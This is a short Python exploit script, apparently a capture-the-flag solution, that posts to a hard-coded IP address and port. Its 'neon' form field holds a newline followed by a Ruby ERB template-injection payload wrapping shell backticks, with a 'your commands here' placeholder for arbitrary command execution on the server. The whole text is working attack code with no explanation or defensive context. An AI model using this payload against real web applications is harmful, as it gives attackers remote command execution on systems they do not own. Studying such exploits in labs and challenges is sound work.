import requests

r = requests.post('http://165.227.238.95:31147', data={'neon': 'hello\n<%=`your commands here`%>'})
print(r.text)
